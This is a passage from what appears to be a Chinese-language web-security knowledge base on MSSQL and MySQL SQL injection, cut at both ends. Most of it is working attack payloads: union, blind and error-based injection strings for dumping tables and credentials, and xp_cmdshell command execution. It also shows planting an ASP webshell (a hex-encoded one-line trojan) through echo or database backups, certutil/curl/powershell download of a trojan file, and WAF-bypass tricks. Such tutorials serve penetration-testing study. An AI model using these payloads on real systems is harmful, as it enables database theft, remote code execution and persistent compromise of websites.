expression 。 select * from users where id = '1' and 1 = cast((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')) as varchar)--+ schema_name() 返回与架构 ID 关联的架构名称。 SCHEMA_NAME ( [ schema_id ] ) schema_id 架构的 ID。 schema_id 是 int。如果没有定义 schema_id，则 SCHEMA_NAME 将返回调用方的默认架构的名称。 schema_id 不是有效 ID 时，返回 NULL。 此处由于本地测试环境不支持该函数，故不做演示，类似相关的类型转换的函数还有很多，就不一一列出来了 >、 这其实也是利用了类型不匹配来报错注入数据 select * from users where id = '1' and (select top 1 name from test..sysobjects where xtype= 'u' and name not in ('users')) > 0--+ select * from users where id = '1' and (select top 1 name from test..sysobjects where xtype= 'u' and name not in ('users')) = 0--+ select * from users where id = '1' and (select top 1 name from test..sysobjects where xtype= 'u' and name not in ('users')) having 1=1 爆表名 having 需要与聚合函数group by 一起使用，当无group by 时，会直接爆出当前表，如下所示： group by ... having 1=1 爆列名 order by 注入 order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到order by排序，order by在select语句中，紧跟在where [where condition]后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟column_name，而预编译是参数化字符串，而order by后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。 判断order by 注入点 通过order by 列名，根据排序返回的情况来判断是否存在，或者使用超大数，构成SQL语句错误 开启错误提示 当开启了错误提示的情况下，可以使用报错注入的方式，在order by 之后使用报错注入的函数来爆出数据 select * from users order by convert(int,db_name)--+ 关闭错误提示 当关闭了错误提示的情况下，可以考虑使用时间盲注来注出数据 时间盲注方式如上盲注篇查看 堆叠注入 MSSQL 默认是可以多语句查询，其与mysql不同的是，MSSQL非常灵活，且可执行系统命令，当存在堆叠查询的语句中，就可以考虑执行系统命令，写入webshell，远程下载木马文件，执行命令getshell等等。 二次注入 场景见MySQL注入基础二次注入 HTTP头部注入 见MySQL注入基础HTTP头部注入 文件操作 MSSQL的文件操作要求要有两大前提： 有相应的权限db_owner 知道文件的绝对路径 在mssql中有两个存储过程可以帮我们来找绝对路径：xp_cmdshell和 xp_dirtree 利用xp_dirtree方法来寻找 execute master..xp_dirtree 'c:' --列出所有c:\\文件、目录、子目录 execute master..xp_dirtree 'c:',1 --只列c:\\目录 execute master..xp_dirtree 'c:',1,1 --列c:\\目录、文件 当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中 CREATE TABLE tmp (dir varchar(8000),num int,num1 int); insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1; 使用xp_cmdshell查找绝对路径 cmd中寻找某文件 for /r c:\\ %i in (*.asp) do echo %i 需要建立一个表存一个char字段就可以了 读 读取文件可以创建一个临时表，将本地文件写入该表中（无法远程登录的情况下，使用堆叠注入） --建立一个临时表 create table #testtable( context ntext ); select * from #testtable --将本地文件写入表中 BULK INSERT #testtable FROM 'c:/1.txt' WITH ( DATAFILETYPE = 'char', KEEPNULLS ) --drop table #testtable; xp_cmpshell执行dos命令，在知道绝对路径的情况下读取文件 exec master..xp_cmdshell 'type c:\\\\1.txt' 写 xp_cmdshell 写入webshell 在得知绝对路径的情况下，使用echo 写入webshell，如果需要换行则使用>>追加写入，注意如=、> 等前使用^来转义 exec master..xp_cmdshell 'echo ^> C:\\Inetpub\\wwwroot\\sqlilabs\\test.asp' 或者使用远程下载 certutil.exe -urlcache -split -f \"\" web_absolute_path/xxx.asp curl -o web_absolute_path/xxx.asp powershell -c \"invoke-webrequest -uri -outfile web_absolute_path/xxx.asp\" DB_owner权限LOG备份Getshell 无论是LOG备份还是差异备份，都是利用备份的过程中写入一句话木马 SQLServer常见的备份策略： 每周一次完整备份 每天一次差异备份 每小时一次事务日志备份 利用前提： 目标机器存在数据库备份文件 ，也就是如果我们利用 test 数据库的话，则需要该test数据库存在数据库备份文件，而且恢复模式得是 完整模式 知道网站的绝对路径 该注入支持堆叠注入 alter database 数据库名 set RECOVERY FULL; #修改数据库恢复模式为 完整模式 create table cmd (a image); #创建一张表cmd，只有一个列 a，类型为image backup log 数据库名 to disk= 'C:\\Inetpub\\wwwroot\\sqlilabs\\1.asp' with init; #备份表到指定路径 insert into cmd (a) values(0x3c256576616c20726571756573742822636d642229253e); #插入一句话到cmd表里 backup log 数据库名 to disk='C:\\Inetpub\\wwwroot\\sqlilabs\\2.asp'; #把操作日志备份到指定文件 drop table cmd; #删除cmd表 第四行的 0x3c256576616c20726571756573742822636d642229253e 是一句话木马 的16进制表示 执行完成之后会在目标网站根目录下生成1.asp和2.asp文件，其中1.asp 保存数据库，2.asp就是我们需要连接的木马文件 DB_owner权限差异备份Getshell 注：差异备份有概率会把网站搞崩，所以不建议使用差异备份 利用前提： 知道网站的绝对路径 该注入支持堆叠注入 注：以下语句一条一条执行 create table [dbo].[test] ([cmd] [image]) insert into [test](cmd) values(0x3c256576616c20726571756573742822636d642229253e) backup database test to disk = 'C:\\Inetpub\\wwwroot\\1.asp' Drop table [test] 第2行的 0x3c256576616c20726571756573742822636d642229253e 是一句话木马 的16进制表示 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 11:40:26 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL注入基础.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/MSSQL/常见防御手段及绕过方式.html":{"url":"知识库/01.WEB安全/01.SQLi/MSSQL/常见防御手段及绕过方式.html","title":"常见防御手段及绕过方式","keywords":"","body":" and / or 被过滤 空格 被过滤/拦截 系统关键字(SELECT，WHERE，UNION...)被过滤/拦截 比较符(> 等号 被过滤/拦截 引号被过滤/拦截 注释符 被过滤/拦截 实战中遇到的mssql很少，也没有成体系的绕过手法，大多与mysql的绕过一样，但是得注意SQL语句的写法。 and / or 被过滤 双写 大小写 内联注释 编码 unicode utf-8 url空格 被过滤/拦截 括号 + 注释符 空白字符(%01-%20) 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 系统关键字(SELECT，WHERE，UNION...)被过滤/拦截 注释符绕过 大小写绕过 内联注释法绕过 双写 比较符(> between a and b 等号 被过滤/拦截 like 引号被过滤/拦截 进制转换（通常十六进制） 注释符 被过滤/拦截 手动闭合 id=1' or '1'='1 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:41:21 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/MSSQL/常见防御手段及绕过方式.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/MYSQL/MYSQL.html":{"url":"知识库/01.WEB安全/01.SQLi/MYSQL/MYSQL.html","title":"MYSQL","keywords":"","body":" MySQL 简介 版本区别 SQL基本语法 参考链接 MySQL 简介 MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。 MySQL 是开源的，目前隶属于 Oracle 旗下产品。 MySQL 支持大型的数据库。可以处理拥有上千万条记录的大型数据库。 MySQL 使用标准的 SQL 数据语言形式。 MySQL 可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。 MySQL 对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言。 MySQL 支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。 MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。版本区别 这里只讨论大版本的区别 版本 区别 5.0 以下 单用户模式，无information_schema库，需要猜解注入 5.0及5.0以上 多用户模式，存在information_schema库，其包含了MySQL的所有表，视图等 SQL基本语法 在MySQL数据库中，常见对数据进行处理的操作有：增，删，改，查，对应的SQL语句以及操作内容分别是： 增 ，增加数据，通常在SQL语句中，其简单结构通常可以表示为： INSERT INTO table_name ( field1, field2,...fieldN ) VALUES ( value1, value2,...valueN ); 删，删除数据，通常在SQL语句中，其简单结构通常可以表示为： DELETE FROM table_name [WHERE Clause] 改，更新数据，通常在SQL语句中，其简单结构通常可以表示为： UPDATE table_name SET field1=new-value1, field2=new-value2 [WHERE Clause] 查，查询数据，通常在SQL语句中，其简单结构可以表示为： SELECT column_name,column_name FROM table_name [WHERE Clause] [LIMIT N][ OFFSET M] 参考链接 https://xz.aliyun.com/t/7169# https://blog.sari3l.com/posts/9622f295/ https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-114 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:41:21 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/MYSQL/MYSQL.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/MYSQL/MYSQL常见符号函数语句归类.html":{"url":"知识库/01.WEB安全/01.SQLi/MYSQL/MYSQL常见符号函数语句归类.html","title":"MYSQL常见符号函数语句归类","keywords":"","body":" 常用符号 注释符 常用运算符 常见全局变量 常用函数 系统函数信息 进制转换 字符串截取/拼接 其他常见函数 常用语句 获取数据库版本 获取当前用户 获取所有数据库 获取当前数据库 获取用户 获取当前数据库的表名 获取当前数据库的某表的列名 获取当前数据库某表的值 常用符号 注释符 注释符 说明 # url编码:%23 | 单行注释 在URL中#表示锚点，也就是hash路由，带上#不会请求后端路由，而是刷新前端路由 | | -- x | 单行注释 x为任意字符，这里表示有一个空格 | | /**/ | 多行(内联)注释 | 常用运算符 运算符 说明 && 同 and || 同 or ! 同 not ^ 异或，同xor \\ 转义符 ~ 一元比特反转 + 加，可替代空格 常见全局变量 变量 说明 @@VERSION 返回版本信息 @@GLOBAL.VERSION 同@@VERSION @@HOSTNAME 返回安装的计算机名称 @@BASEDIR 返回MYSQL绝对路径 常用函数 系统函数信息 函数 说明 USER() 获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。 DATABASE() 获取当前选择的数据库名，同SCHEMA() VERSION() 获取当前版本信息。 进制转换 函数 说明 ORD(str) 返回字符串第一个字符的ASCII值。 OCT(N) 以字符串形式返回 N 的八进制数，N 是一个BIGINT 型数值，作用相当于CONV(N,10,8)。 HEX(N_S) 参数为字符串时，返回 N_or_S 的16进制字符串形式，为数字时，返回其16进制数形式。 UNHEX(str) HEX(str) 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。 BIN(N) 返回十进制数值 N 的二进制数值的字符串表现形式。 ASCII(str) 同ORD(string)。 CONV(N,from_base,to_base) 将数值型参数 N 由初始进制 from_base 转换为目标进制 to_base 的形式并返回。 CHAR(N,... [USING charset_name]) 将每一个参数 N 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。 字符串截取/拼接 函数 说明 SUBSTR(str,N_start,N_length) 对指定字符串进行截取，为SUBSTRING的简单版。 SUBSTRING() 多种格式SUBSTRING(str,pos)、 SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、 SUBSTRING(str FROM pos FOR len)。 | | RIGHT(str,len) | 对指定字符串从最右边截取指定长度。 | | LEFT(str,len) | 对指定字符串从最左边截取指定长度。 | | RPAD(str,len,padstr) | 在 str 右方补齐 len 位的字符串 padstr，返回新字符串。如果 str 长度大于 len，则返回值的长度将缩减到 len 所指定的长度。 | | LPAD(str,len,padstr) | 与RPAD相似，在str左边补齐。 | | MID(str,pos,len) | 同于 SUBSTRING(str,pos,len)。 | | INSERT(str,pos,len,newstr) | 在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。 | | CONCAT(str1,str2...) | 函数用于将多个字符串合并为一个字符串 | | GROUP_CONCAT(...) | 返回一个字符串结果，该结果由分组中的值连接组合而成。 | | MAKE_SET(bits,str1,str2,...) | 根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：EXP(MAKE_SET((LENGTH(DATABASE())>8)+1,'1','710'))。 | 其他常见函数 函数/语句 说明 IF(exp,state1,state2) 条件语句，exp为true，执行state1，否则执行state2 CASE...WHEN exp THEN state1 ELSE state2 END 同IF SLEEP(N) 休眠N秒 BENCHMARK(count,exp)： 执行表达式exp，count次（消耗CPU） LENGTH(str) 返回字符串的长度。 PI() 返回π的具体数值。 REGEXP \"statement\" 正则匹配数据，返回值为布尔值。 LIKE \"statement\" 匹配数据，%代表任意内容。返回值为布尔值。 RLIKE \"statement\" 与regexp相同。 LOCATE(substr,str,[pos]) 返回子字符串第一次出现的位置。 POSITION(substr IN str) 等同于 LOCATE()。 LOWER(str) 将字符串的大写字母全部转成小写。同：LCASE(str)。 UPPER(str) 将字符串的小写字母全部转成大写。同：UCASE(str)。 ELT(N,str1,str2,str3,...) 与MAKE_SET(bit,str1,str2...)类似，根据N返回参数值。 NULLIF(expr1,expr2) 若expr1与expr2相同，则返回expr1，否则返回NULL。 CHARSET(str) 返回字符串使用的字符集。 DECODE(crypt_str,pass_str) 使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：ENCODE(str,pass_str)。 常用语句 获取数据库版本 select version(); 获取当前用户 select user() 获取所有数据库 select schema_name from information_schema.schemata; 获取当前数据库 select database() 获取用户 desc mysql.user select * from mysql.user 获取当前数据库的表名 select table_name from information_schema.tables where table_schema = database() 获取当前数据库的某表的列名 select column_name from information_schema.columns where table_name = 'users' 获取当前数据库某表的值 select id ,username,password from users; Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:41:21 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/MYSQL/MYSQL常见符号函数语句归类.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/MYSQL/MySQL注入基础.html":{"url":"知识库/01.WEB安全/01.SQLi/MYSQL/MySQL注入基础.html","title":"MySQL注入基础","keywords":"","body":" 初始环境 联合查询注入 注入流程 盲注 布尔盲注 布尔盲注常用函数 一般流程 布尔盲注常见语句 时间盲注 时间盲注常用函数 时间盲注场景 报错注入 exp() ExtractValue() updatexml() floor报错 几何函数 不存在的函数 BIGINT name_const() uuid join using GTID() 宽字节注入 order by 注入 二次注入 堆叠注入 HTTP 头部注入 文件读/写 读文件 写文件 日志包含 DNSlog外带数据盲注 初始环境 环境 版本 服务器 Ubuntu 14.04 web 容器 Apache2 数据库 mysql 5.5.47 靶场环境（docker） SQLi-Labs（Mysql） MySQL8 (docker) mysql8.0.26 MySQL5(docker) mysql5.5.56 MySQL注入相对于其他注入可能对于大家来讲应该是最拿得出手的，在这里使用SQLi-Labs（MySQL）作为环境依赖，以及选择了MySQL8作为支撑新语法特性来展开讨论，本篇只介绍基础的注入知识，只谈针对MySQL该如何注入，如果有更好的注入大法，希望各位讨论 联合查询注入 页面将SQL语句返回的内容显示在了页面中(本例中是标题、内容、作者等信息)，这种情况就叫有回显。 对于有回显的情况来说，通常使用联合查询注入法，其作用就是，在原来查询条件的基础上，通过关键字union ，union all，从而拼接恶意SQL语句，union后面的select 得到的结果将拼接到前个select的结果的后面 若回显仅支持一行数据的话，让union前边正常的查询语句返回的结果为空 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接 union，union all区别 union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序； 注入流程 此处以sqli-labs Less 1 举例 首先确定字段数量 使用 order/group by语句，通过拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于/等于，则页面正常。若错误页面与正常页面一致，更换盲注或报错注入 正常页面： 错误页面： 判断页面回显位 根据上述判断的字段数量，使用union select 1,2,3,x... 将定义的数字显示在页面上，即可从中判断页面显示的字段位置。 注意： 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的select查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null，如下所示 这里在以sqli-labs 的less 1举例说明 通过第2步，找到显位之后，在显示字段位置使用子查询或直接查询，来查询数据。 首先查询当前数据库名database()、数据库账号user()、数据库版本version()等基本信息，再根据不同版本，不同的权限来确定接下来的方法 若MySQL版本 information_schema，故通常情况下，无法直接找到表，字段等信息，只能通过猜解的方式来解决 直接猜库名，表名，列名，再使用联合查询，当然也可以使用布尔注入来猜解 若MySQL版本 >= 5.0 我们看以下SQL语句，使用该语句则可以获取所有的数据库，如果不涉及跨库查询，这一步可以省略 -- sql select schema_name from information_schema.schemata; -- inject sql ?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+ 查表名 ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+ 查列名 ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+ 查值 ?id=-1' union select 1,2,group_concat(0x23,username,0x23,password) from users--+ 简单来说，查库名 -> 查表名 -> 查列名 -> 查值 -- 判断字段数目 order by -- 联合查询搜集信息(表中字段数为3，注意字符类型，如 int，String之类的) union select 1,2,3 -- 查询当前数据库名称 union select 1,2,database(); -- 查询所有数据库 union select 1,2,group_concat(schema_name) from information_schema.schemata; --查询当前数据库中的所有表名 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database(); -- 查询某表的列名 union select 1,2,group_concat(column_name) from information_shcema.columns where table_name = 'student' -- studnet 表示 具体的表名 -- 查询数据 union select 1,2,group_concat(id,name,age) from student; 盲注 核心：利用逻辑符号/条件函数，让返回的内容/响应时间与正常页面不符 布尔盲注 通过页面对永真条件，or 1=1 与 永假条件，and 1=2 返回的内容是否存在差异，进行判断是否可以进行布尔盲注。通常返回存在/不存在两个结果，就可以判断是否存在布尔盲注 -- 语句如下，如果condition为真，那么整条语句 where 语句则恒真 select * from users where username=$username and (condition) and 1=1 恒真 and 1=2 恒假 利用这一特性，我们可以构造payload 通过来页面显示情况来获取数据库数据 布尔盲注常用函数 ascii() 返回指定字符的ascii码值 count() 计算结果集的数量 length() 返回指定字符串的长度 substr/substring(str,pos,length) 返回截取的子字符串 一般流程 求闭合字符 求当前数据库长度 求当前数据库ascii码值 求表名的数量 求表名的长度 求表名的ascii码值 求列名的数量 求列名的长度 求列名的ascii码值 求字段的数量 求字段的长度 求字段的ascii码值 布尔盲注常见语句 求数据库长度 ?id=1' and (length(database())=8) --+ ?id=1' and (length(database())>7) --+ ?id=-1' or (length(database())>7) --+ # 也可以用大于小于来判断 求数据库名(可以用字符来比对，也可以用ascii来比对) ?id=1' and (left(database(),1)='s') --+ #从左向右截取一个字符 ?id=1' and (left(database(),2)='se') --+ #从左向右截取两个字符 ?id=1' and ascii(substr(database(),1,1)) =115 --+ #从第一个字符开始截取一个字符，也就是第一个字符是's',对应的ascii码是115 ？id=1' and ascii(substr(database(),2,1)) =101 --+ #从第二个字符开始截取一个字符，也就是第二个字符'e',对应的ascii码是101 ?id=1' and ascii(substr(database(),1,1)) 来比较查找 求当前数据库中当前表的数量 ?id=1' and 4=(select count(table_name) from information_schema.tables where table_schema=database()) --+ ?id=1' and 4=(select count(table_name) from information_schema.tables where table_schema='security') --+ 求当前数据库表名的长度 ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),7,1)) --+ #表名的长度就是substr函数中的7-1=6,这里是针对security数据库的第一个表emails ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),7,1)) --+ #limit 1,1就是security中得到第二个数据库 ?id=1' and (length((select table_name from information_schema.tables where table_schema='security' limit 0,1) )=6) --+ #第二种方法使用length来测数据库表名的的长度，通过limit来控制是哪一个表 ?id=1' and (length((select table_name from information_schema.tables where table_schema='security' limit 1,1) )=8) --+ 求当前数据库表名 ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+ 格式为：ascii(substr(xxx limit null,1),null,1) ,对递增依次 猜解 #对security数据库中的第一个表的第一个字符进行ascii的猜解 ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+ #对security数据库中的第一个表的第二个字符进行ascii的猜解 求指定表中列的数量 ?id=1' and (select count(column_name) from information_schema.columns where table_name='users')=20 --+ 求对列名的长度 ?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),2,1)) --+ #长度和前面查表名的长度一样，是2-1=1,如果是则返回页面异常，如果不是则返回界面正常，递增测试 方法二： 使用length来判断 ?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=2 --+ dump 字段的值 ?id=1' and ascii(substr((select username from security.users limit 0,1),1,1))=67--+ ?id=1' and ascii(substr((select concat(username,':',password) from security.users limit 0,1),1,1))=68--+ 盲注一般找到注入点之后，直接上sqlmap，不会手工去dump，如果sqlmap跑不出来，那么该怎么办？ 这里就要针对ascii字符集来判断，有一个特别重要的思路，利用&运算来进行按位与运算 ```sql 115 => 01110011 (ascii('s')) 256 = 2 0 + 2 1 + 2 2 + ...... + 2 7 20 => 00000001 = 1 21 => 00000010 = 2 22 => 00000100 = 4 23 => 00001000 = 8 24 => 00010000 = 16 25 => 00100000 = 32 26 => 01000000 = 64 27 => 10000000 = 128 我们将待求解的ascii码值与上述值进行与运算 115 & 1 => 1 115 & 2 => 2 115 & 4 => 0 115 & 8 => 0 115 & 16 => 16 115 & 32 => 32 115 & 64 => 64 115 & 128 => 0 1 + 2 + 0 + 0 + 16 + 32 + 64 + 0 = 115 ### 时间盲注 通过判断页面返回内容的响应时间差异进行条件判断。 通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、复杂正则表达式等等。 #### 时间盲注常用函数 - if(1,2,3)：如果1为True，则执行2，否则执行3 - sleep(x)：延迟x秒之后执行 - ascii(char)：将字符转换为对应的ascii码 - substr(str,pos,len)：将字符串从pos位开始截取len长度 - Benchmark(count,exp)： 执行表达式exp，count次（消耗CPU） - case ... when ... then ... else ... end #### 时间盲注场景 - 第一种情况：无论输入什么都只显示无信息页面，如登录页面。这种情况下可能只有登录失败页面，错误页面被屏蔽了，并且在没有密码的情况下，登录成功的页面一般情况也不知道。在这种情况下有可能基于时间的SQL注入会有效 - 第二种情况：无论输入什么都只显示正常信息页面。例如，采集登录用户信息的模块页面，采集用户的IP，浏览器类型，referer字段，session字段，无论用户输入什么，都显示正常页面 相关注入手法同布尔盲注，介绍一下相关的函数 - case ... when [条件] then [TRUE 执行的语句] else [FALSE执行的语句] end ```sql select * from users where id = 1 and case 1 when 1=1 then sleep(2) else 1 end; Benchmark(count,exp) select BENCHMARK(10000000,md5('a')); 笛卡尔积 select * from users where id = 1 and (select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C); 报错注入 服务器开启报错信息返回，也就是发生错误时返回报错信息，通过特殊函数的错误使用使其参数被页面输出。 报错函数通常有最长报错输出的限制，面对这种情况，可以进行分割输出。 特殊函数的特殊参数运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可。 exp() 函数语法：exp(int x) 返回 e ** x 适用范围： 在mysql>5.5.53时，则不能返回查询结果； 在版本号为5.5.47上可以用来注入： 该函数将会返回e的x次方结果。正常如下图： e的x次方到x每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错 将0按位取反，~0，可以看到取值为18446744073709551615，这个值就比709要大很多很多，所以再利用mysql 函数正常取值之后会返回0的特性，那么当函数执行成功，然后按位取反之后得到的值直接造成double型溢出 select exp(~(select * from (select version())x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '5.5.47-0ubuntu0.14.04.1' from dual)))' ?id=1' and exp(~(select * from (select version())x))--+ exp()函数套用两层的子查询的原因： 先查询 select user() 这里面的语句，将这里面查询出来的数据作为一个结果集 取名为 a 再 select from a 查询a ,将结果集a 全部查询出来；这里必须使用嵌套，因为不使用嵌套不加select from 无法大整数溢出。ExtractValue() 函数语法：extractvalue(xml_frag,xpath_expr) 适用范围：5.1.5+ 报错原理: Xpath格式语法书写错误的话，就会报错，如下所示mysql> SELECT extractvalue('xy','/a/b') as result; +--------+ | result | +--------+ | x y | +--------+ SELECT extractvalue('xy','#username') as result > 1105 - XPATH syntax error: '#username' > 时间: 0.001s 由于此报错注入和updatexml都只能爆最大32位，如果要爆出32位之后的数据，需要借助mid函数进行字符截取从而显示32位以后的数据 mid函数 参数 描述 column_name 必需。要提取字符的字段 start 必需。开始位置 length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本 ?id=1' and extractvalue(1, mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()) ,0x23),1,32))--+ 其他爆库，爆字段，爆数据库值等更改SQL语句即可 updatexml() 函数语法：updatexml(XML_document,XPath_String,new_value) 适用范围：5.1.5+ 报错原理: Xpath格式语法书写错误的话，就会报错，同extractValue() -- payload updatexml(1,concat(0x23,user(),0x23),1) ?id=1' and updatexml(1,mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()),0x23),1,32),1)--+ floor报错 相关函数： floor() 函数，向下取整 rand() 函数，取随机数，若有参数x，则每个x对应一个固定的值，如果连续多次执行会变化，但是可以预测 floor( rand( 0 ) * 2 ) 产生的序列为011011... 报错原理： 利用数据库表主键不能重复的原理，使用 GROPU BY 分组，产生主键key冗余，导致报错 GROPU BY 原理 已知表users如下 ID NAME 1 AA 2 AA 3 BB sql语句 select count(*) ,name from uses group by name; 在进行分组运算的时候会根据name属性，创建一个虚拟表，从上至下扫描，当扫描到第一行NAME === AA 的时候，当前虚拟表没有该字段，那么插入此虚拟表，count = 1 count name 1 AA 当扫描到第二行 NAME === AA 的时候 当前虚拟表存在该字段，那么count + 1 count name 2 AA 当扫描到第三行 NAME === BB 的时候 当前虚拟表不存在该字段，执行插入，count = 1 count name 2 AA 1 BB 那么利用floor( rand( 0 ) * 2) 这个函数的返回值，进行分组，因为序列为011011... 那么构建SQL语句 SELECT COUNT(*),floor(RAND(0)*2) as x from users GROUP BY x 查询第一条记录，别名x 产生 键值0，当键值 0 不存在虚拟表时，执行插入,此时别名x是一个函数，是变量，在执行插入时，按照GROUP BY分组之时 又要执行floor函数，得到1 ，故向虚拟表中插入键值1，count = 1 COUNT x 1 1 查询第二条记录，别名x产生键值1，虚拟表中存在1，则令count + 1 = 2 COUNT x 2 1 查询第三条记录，别名x产生键值0，键值0不存在临时表，执行插入，别名x再次执行得键值1，由于1存在于临时表，那么插入之后如下表所示 COUNT x 2 1 1 1 由于数据库主键唯一性，现在临时表中存在两个键值为1，主键冗余，所以报错 由于数据库报错会将报错原因展示出来，故利用报错来实现注入 由上知，要保证floor报错注入，那么必须 保证数据库必须大于三条数据 取数据库 SELECT * FROM users WHERE id = 1 AND (SELECT 1 from (SELECT count(*),concat(0x23, database(), 0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x) as y) 由于 and 后要跟1或者0，所以构造sql语句select 1 ，其中 concat()函数是用来连接字符串的函数，因为information_schema.'columns'的数据是大于3条，所以会出现报错，报错结果或将别名x的信息展示出来，展示信息为#(数据库名称)#1冗余 爆表 SELECT * FROM users WHERE id = 1 AND (SELECT 1 from (SELECT count(*),concat(0x23, (SELECT table_name from information_schema.`TABLES` WHERE table_schema = database() LIMIT 0,1), 0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x) as y) 几何函数 GeometryCollection：id=1 AND GeometryCollection((select from (select from(select user())a)b)) polygon()：id=1 AND polygon((select from(select from(select user())a)b)) multipoint()：id=1 AND multipoint((select from(select from(select user())a)b)) multilinestring()：id=1 AND multilinestring((select from(select from(select user())a)b)) linestring()：id=1 AND LINESTRING((select from(select from(select user())a)b)) multipolygon() ：id=1 AND multipolygon((select from(select from(select user())a)b)) 不存在的函数 随便使用不存在的函数，可能会得到当前所在数据库的名称 BIGINT 当mysql数据库的某些边界数值进行数值运算时，会报错的原理。 如~0得到的结果：18446744073709551615 若此数参与运算，则很容易会错误。 select !(select * from(select user())a)-~0; select * from users where id = 1 and (select !(select * from(select mid(group_concat(table_name),21,32) from information_schema.tables where table_schema = database())a)-~0); name_const() 报错原理： mysql列名重复会导致报错,通过name_const制造一个列 我们可以利用mysql列名重复会导致报错这个原理，配合笛卡尔积查询得到列名 局限：仅可取数据库版本信息 select * from users where id = 1 and (select * from(select name_const(version(),0x1),name_const(version(),0x1))a); uuid 适用版本：8.0.x select * from users where id = 1 and UUID_TO_BIN((SELECT password FROM users WHERE id=1)); SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1)); join using 通过系统关键词join可建立两个表之间的内连接。 通过对想要查询列名的表与其自身建立内连接，会由于冗余的原因(相同列名存在)，而发生错误。 并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。 select * from(select * from users a join (select * from users)b)c; select * from(select * from users a join (select * from users)b using(username))c; select * from(select * from users a join (select * from users)b using(username,password))c GTID() 原理：参数格式不正确 select gtid_subset(user(),1); select gtid_subtract((select * from(select user())a),1); 宽字节注入 举个例子，以SQLi-Labs Less33为例 